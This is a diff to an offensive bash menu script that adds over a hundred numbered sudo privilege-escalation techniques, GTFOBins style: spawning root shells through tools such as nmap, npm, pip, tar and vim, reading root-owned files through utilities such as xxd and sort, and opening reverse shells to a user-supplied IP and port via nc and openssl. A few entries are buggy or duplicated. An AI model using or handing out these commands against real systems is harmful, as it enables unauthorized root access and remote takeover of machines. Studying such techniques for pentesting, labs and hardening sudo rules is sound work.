@@ -217,7 +217,45 @@ while true; do
 	echo -ne " 352. PrivEsc with make\t\t\t\t\t353. PrivEsc with man\t\t\t\t354. PrivEsc with mawk\n"
 	echo -ne " 355. PrivEsc with more\t\t\t\t\t356. PrivEsc with mount\t\t\t\t357. Read a root's file with msgattrib\n"
 	echo -ne " 358. Read a root's file with msgcat\t\t\t359. Read a root's file with msgconv\t\t360. PrivEsc with msgfilter\n"
-	echo -ne " 361. Read a root's file with msgmerge\n"
+	echo -ne " 361. Read a root's file with msgmerge\t\t\t362. Read a root's file with msguniq\t\t363. Read a root's file with mtr\n"
+	echo -ne " 364. PrivEsc with mysql\t\t\t\t365. Read a root's file with nasm\t\t366. PrivEsc with nawk\n"
+	echo -ne " 367. SUDO RevShell with nc\t\t\t\t368. Read a root's file with neofetch\t\t369. PrivEsc with nice\n"
+	echo -ne " 370. Read a root's file with nl\t\t\t371. PrivEsc with nmap\t\t\t\t372. PrivEsc with node\n"
+	echo -ne " 373. PrivEsc with nohup\t\t\t\t374. PrivEsc with npm\t\t\t\t375. PrivEsc with nroff\n"
+	echo -ne " 376. PrivEsc with nsenter\t\t\t\t378. PrivEsc with octave-cli\t\t\t379. Read a root's file with od\n"
+	echo -ne " 380. SUDO RevShell with openssl\t\t\t381. Read a root's file with openvpn\t\t382. PrivEsc with openvt\n"
+	echo -ne " 383. Read a root's file with paste\t\t\t384. PrivEsc with pdb\t\t\t\t385. PrivEsc with pdflatex\n"
+	echo -ne " 386. PrivEsc with pdftex\t\t\t\t387. PrivEsc with perl\t\t\t\t388. PrivEsc with pg\n"
+	echo -ne " 389. PrivEsc with php\t\t\t\t\t390. PrivEsc with pip\t\t\t\t391. PrivEsc with pkexec\n"
+	echo -ne " 392. Read a root's file with pr\t\t\t393. PrivEsc with pry\t\t\t\t394. PrivEsc with psql\n"
+	echo -ne " 395. PrivEsc with puppet\t\t\t\t396. PrivEsc with python\t\t\t397. PrivEsc with rake\n"
+	echo -ne " 398. Read a root's file with readelf\t\t\t399. Read a root's file with redcarpet\t\t400. Read a root's file with rev\n"
+	echo -ne " 401. PrivEsc with rlwrap\t\t\t\t402. PrivEsc with rpm\t\t\t\t403. PrivEsc with rpmquery\n"
+	echo -ne " 404. PrivEsc with rsync\t\t\t\t405. PrivEsc with ruby\t\t\t\t406. PrivEsc with run-mailcap\n"
+	echo -ne " 407. PrivEsc with run-parts\t\t\t\t408. PrivEsc with rview\t\t\t\t409. PrivEsc with rvim\n"
+	echo -ne " 410. PrivEsc with scp\t\t\t\t\t411. PrivEsc with screen\t\t\t412. PrivEsc with script\n"
+	echo -ne " 413. PrivEsc with sed\t\t\t\t\t414. PrivEsc with service\t\t\t415. PrivEsc with setarch\n"
+	echo -ne " 416. PrivEsc with sg\t\t\t\t\t417. PrivEsc with slsh\t\t\t\t418. PrivEsc with socat\n"
+	echo -ne " 419. Read a root's file with soelim\t\t\t420. Read a root's file with sort\t\t421. PrivEsc with split\n"
+	echo -ne " 422. PrivEsc with sqlite3\t\t\t\t423. Read a root's file with ss\t\t\t424. PrivEsc with ssh-keygen\n"
+	echo -ne " 425. Read a root's file with ssh-keyscan\t\t426. PrivEsc with ssh\t\t\t\t427. PrivEsc with start-stop-daemon\n"
+	echo -ne " 428. PrivEsc with stdbuf\t\t\t\t429. PrivEsc with strace\t\t\t430. Read a root's file with strings\n"
+	echo -ne " 431. PrivEsc with su\t\t\t\t\t432. Read a root's file with sysctl\t\t433. PrivEsc with systemctl\n"
+	echo -ne " 434. PrivEsc with systemd-resolve\t\t\t435. Read a root's file with tac\t\t436. Read a root's file with tail\n"
+	echo -ne " 437. PrivEsc with tar\t\t\t\t\t438. PrivEsc with taskset\t\t\t439. Read a root's file with tbl\n"
+	echo -ne " 440. PrivEsc with tclsh\t\t\t\t441. PrivEsc with tcpdum\t\t\t442. PrivEsc with tex\n"
+	echo -ne " 443. Read a root's file with tic\t\t\t444. PrivEsc with time\t\t\t\t445. PrivEsc with timedatectl\n"
+	echo -ne " 446. PrivEsc with timeout\t\t\t\t447. PrivEsc with tmux\t\t\t\t448. Read a root's file with troff\n"
+	echo -ne " 449. Read a root's file with ul\t\t\t450. Read a root's file with unexpand\t\t451. Read a root's file with uniq\n"
+	echo -ne " 452. PrivEsc with unshare\t\t\t\t453. Read a root's file with uudecode\t\t454. Read a root's file with uuencode\n"
+	echo -ne " 455. PrivEsc with valgrind\t\t\t\t456. PrivEsc with vi\t\t\t\t457. PrivEsc with view\n"
+	echo -ne " 458. PrivEsc with vigr\t\t\t\t\t459. PrivEsc with vim\t\t\t\t460. PrivEsc with vimdiff\n"
+	echo -ne " 461. PrivEsc with vipw\t\t\t\t\t462. PrivEsc with watch\t\t\t\t463. Read a root's file with wc\n"
+	echo -ne " 464. Read a root's file with whiptail\t\t\t465. PrivEsc with wish\t\t\t\t466. PrivEsc with xargs\n"
+	echo -ne " 467. PrivEsc with xelatex\t\t\t\t468. PrivEsc with xetex\t\t\t\t469. Read a root's file with xmodmap\n"
+	echo -ne " 470. Read a root's file with xmore\t\t\t471. Read a root's file with xxd\t\t472. Read a root's file with xz\n"
+	echo -ne " 473. PrivEsc with yarn\t\t\t\t\t474. PrivEsc with zip\t\t\t\t475. PrivEsc with zsh\n"
+	echo -ne " 476. Read a root's file with zsoelim\t\t\t477. Read a SUDO technique from gtfobins\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -2112,6 +2150,601 @@ while true; do
 		if [[ -f "$LFILE" ]];
 		then
 			sudo msgmerge -P $LFILE /dev/null
+		fi
+	;;
+	"362")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo msguniq -P $LFILE
+		fi
+	;;
+	"363")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo mtr --raw -F "$LFILE"
+		fi
+	;;
+	"364")
+		sudo mysql -e '\! /bin/sh'
+	;;
+	"365")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo nasm -@ $LFILE
+		fi
+	;;
+	"366")
+		sudo nawk 'BEGIN {system("/bin/sh")}'
+	;;
+	"367")
+		echo "Digit your IP"
+		read -p "(example, 10.11.12.13) " RHOST
+		if [[ "$RHOST" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(example, 9001) " RPORT
+			if [[ "$RPORT" != "" ]];
+			then
+				echo "nc -lvnp ""$RPORT"
+				sudo nc -e /bin/sh $RHOST $RPORT
+			fi
+		fi
+	;;
+	"368")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo neofetch --ascii $LFILE
+		fi
+	;;
+	"369")
+		sudo nice /bin/sh
+	;;
+	"370")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo nl -bn -w1 -s '' $LFILE
+		fi
+	;;
+	"371")
+		TF=$(mktemp)
+		echo 'os.execute("/bin/sh")' > $TF
+		sudo nmap --script=$TF
+	;;
+	"372")
+		sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+	;;
+	"373")
+		sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
+	;;
+	"374")
+		TF=$(mktemp -d)
+		echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+		sudo npm -C $TF --unsafe-perm i
+	;;
+	"375")
+		TF=$(mktemp -d)
+		echo '#!/bin/sh' > $TF/groff
+		echo '/bin/sh' >> $TF/groff
+		chmod +x $TF/groff
+		sudo GROFF_BIN_PATH=$TF nroff
+	;;
+	"376")
+		sudo nsenter /bin/sh
+	;;
+	"378")
+		sudo octave-cli --eval 'system("/bin/sh")'
+	;;
+	"379")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo od -An -c -w9999 "$LFILE"
+		fi
+	;;
+	"380")
+		echo "Digit your IP"
+		read -p "(example, 10.11.12.13) " RHOST
+		if [[ "$RHOST" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(example, 9001) " RPORT
+			if [[ "$RPORT" != "" ]];
+			then
+				mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+			fi
+		fi
+	;;
+	"381")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo openvpn --config "$LFILE"
+		fi
+	;;
+	"382")
+		echo "Digit a command"
+		read -p "(example, /bin/bash) " COMMAND
+		if [[ "$COMMAND" != "" ]];
+		then
+			TF=$(mktemp -u)
+			sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
+			cat $TF
+		fi
+	;;
+	"383")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo paste $LFILE
+		fi
+	;;
+	"384")
+		TF=$(mktemp)
+		echo 'import os; os.system("/bin/sh")' > $TF
+		sudo pdb $TF
+		cont
+	;;
+	"385")
+		sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+	;;
+	"386")
+		sudo pdftex --shell-escape '\write18{/bin/sh}\end'
+	;;
+	"387")
+		sudo perl -e 'exec "/bin/sh";'
+	;;
+	"388")
+		echo "!/bin/sh"
+		sudo pg /etc/profile
+		!/bin/sh
+	;;
+	"389")
+		echo "Digit a command"
+		read -p "(example, /bin/bash) " CMD
+		if [[ "$CMD" != "" ]];
+		then
+			sudo php -r "system('$CMD');"
+		fi
+	;;
+	"390")
+		TF=$(mktemp -d)
+		echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+		sudo pip install $TF
+	;;
+	"391")
+		sudo pkexec /bin/sh
+	;;
+	"392")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo pr -T $LFILE
+		fi
+	;;
+	"393")
+		echo "system(\"/bin/sh\")"
+		sudo pry
+	;;
+	"394")
+		echo "\\?"
+		echo "!/bin/sh"
+		sudo psql
+	;;
+	"395")
+		sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
+	;;
+	"396")
+		sudo python -c 'import os; os.system("/bin/sh")'
+	;;
+	"397")
+		sudo rake -p '`/bin/sh 1>&0`'
+	;;
+	"398")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo readelf -a @$LFILE
+		fi
+	;;
+	"399")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo redcarpet "$LFILE"
+		fi
+	;;
+	"400")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo rev $LFILE | rev
+		fi
+	;;
+	"401")
+		sudo rlwrap /bin/sh
+	;;
+	"402")
+		sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
+	;;
+	"403")
+		sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
+	;;
+	"404")
+		sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+	;;
+	"405")
+		sudo ruby -e 'exec "/bin/sh"'
+	;;
+	"406")
+		echo "!/bin/sh"
+		sudo run-mailcap --action=view /etc/hosts
+	;;
+	"407")
+		sudo run-parts --new-session --regex '^sh$' /bin
+	;;
+	"408")
+		sudo rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+	;;
+	"409")
+		sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+	;;
+	"410")
+		TF=$(mktemp)
+		echo 'sh 0<&2 1>&2' > $TF
+		chmod +x "$TF"
+		sudo scp -S $TF x y:
+	;;
+	"411")
+		sudo screen
+	;;
+	"412")
+		sudo script -q /dev/null
+	;;
+	"413")
+		sudo sed -n '1e exec sh 1>&0' /etc/hosts
+	;;
+	"414")
+		sudo service ../../bin/sh
+	;;
+	"415")
+		sudo setarch $(arch) /bin/sh
+	;;
+	"416")
+		sudo sg root
+	;;
+	"417")
+		sudo slsh -e 'system("/bin/sh")'
+	;;
+	"418")
+		sudo socat stdin exec:/bin/sh
+	;;
+	"419")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo soelim "$LFILE"
+		fi
+	;;
+	"420")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo sort -m "$LFILE"
+		fi
+	;;
+	"421")
+		sudo split --filter=/bin/sh /dev/stdin
+	;;
+	"422")
+		sudo sqlite3 /dev/null '.shell /bin/sh'
+	;;
+	"423")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo ss -a -F $LFILE
+		fi
+	;;
+	"424")
+		sudo ssh-keygen -D ./lib.so
+	;;
+	"425")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo ssh-keyscan -f $LFILE
+		fi
+	;;
+	"426")
+		sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+	;;
+	"427")
+		sudo start-stop-daemon -n $RANDOM -S -x /bin/sh
+	;;
+	"428")
+		sudo stdbuf -i0 /bin/sh
+	;;
+	"429")
+		sudo strace -o /dev/null /bin/sh
+	;;
+	"430")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo strings "$LFILE"
+		fi
+	;;
+	"431")
+		sudo su
+	;;
+	"432")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo sysctl -n "/../../$LFILE"
+		fi
+	;;
+	"433")
+		echo "!sh"
+		sudo systemctl
+	;;
+	"434")
+		echo "!sh"
+		sudo systemd-resolve --status
+	;;
+	"435")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo tac -s 'RANDOM' "$LFILE"
+		fi
+	;;
+	"436")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo tail -c1G "$LFILE"
+		fi
+	;;
+	"437")
+		sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+	;;
+	"438")
+		sudo taskset 1 /bin/sh
+	;;
+	"439")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo tbl $LFILE
+		fi
+	;;
+	"440")
+		echo "exec /bin/sh <@stdin >@stdout 2>@stderr"
+		sudo tclsh
+	;;
+	"441")
+		echo "Digit a command"
+		read -p "(example, /bin/bash) " COMMAND
+		if [[ "$COMMAND" != "" ]];
+		then
+			TF=$(mktemp)
+			echo "$COMMAND" > $TF
+			chmod +x $TF
+			sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+		fi
+	;;
+	"442")
+		sudo tex --shell-escape '\write18{/bin/sh}\end'
+	;;
+	"443")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo tic -C "$LFILE"
+		fi
+	;;
+	"444")
+		sudo time /bin/sh
+	;;
+	"445")
+		echo "!/bin/sh"
+		sudo timedatectl list-timezones
+	;;
+	"446")
+		sudo timeout --foreground 7d /bin/sh
+	;;
+	"447")
+		sudo tmux
+	;;
+	"448")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo troff $LFILE
+		fi
+	;;
+	"449")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo ul "$LFILE"
+		fi
+	;;
+	"450")
+		echo "Digit a root's file to make readable"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo unexpand -t99999999 "$LFILE"
+		fi
+	;;
+	"451")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo uniq "$LFILE"
+		fi
+	;;
+	"452")
+		sudo unshare /bin/sh
+	;;
+	"453")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo uuencode "$LFILE" /dev/stdout | uudecode
+		fi
+	;;
+	"454")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo uuencode "$LFILE" /dev/stdout | uudecode
+		fi
+	;;
+	"455")
+		sudo valgrind /bin/sh
+	;;
+	"456")
+		sudo vi -c ':!/bin/sh' /dev/null
+	;;
+	"457")
+		sudo view -c ':!/bin/sh'
+	;;
+	"458")
+		sudo vigr
+	;;
+	"459")
+		sudo vim -c ':!/bin/sh'
+	;;
+	"460")
+		sudo vimdiff -c ':!/bin/sh'
+	;;
+	"461")
+		sudo vipw
+	;;
+	"462")
+		sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
+	;;
+	"463")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo wc --files0-from "$LFILE"
+		fi
+	;;
+	"464")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo whiptail --textbox --scrolltext "$LFILE" 0 0
+		fi
+	;;
+	"465")
+		echo "exec /bin/sh <@stdin >@stdout 2>@stderr"
+		sudo wish
+	;;
+	"466")
+		sudo xargs -a /dev/null sh
+	;;
+	"467")
+		sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+	;;
+	"468")
+		sudo xetex --shell-escape '\write18{/bin/sh}\end'
+	;;
+	"469")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo xmodmap -v $LFILE
+		fi
+	;;
+	"470")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo xmore $LFILE
+		fi
+	;;
+	"471")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo xxd "$LFILE" | xxd -r
+		fi
+	;;
+	"472")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo xz -c "$LFILE" | xz -d
+		fi
+	;;
+	"473")
+		sudo yarn exec /bin/sh
+	;;
+	"474")
+		TF=$(mktemp -u)
+		sudo zip $TF /etc/hosts -T -TT 'sh #'
+		sudo rm $TF
+	;;
+	"475")
+		sudo zsh
+	;;
+	"476")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo zsoelim "$LFILE"
+		fi
+	;;
+	"477")
+		echo "Digit a command to watch sudo technique from gtfobins"
+		read -p "(example, zip): " SDCMD
+		if [[ "$SDCMD" != "" ]];
+		then
+			$CURLP -s -k -L "https://gtfobins.github.io/gtfobins/""$SDCMD""/#sudo" | less
 		fi
 	;;
 	*)
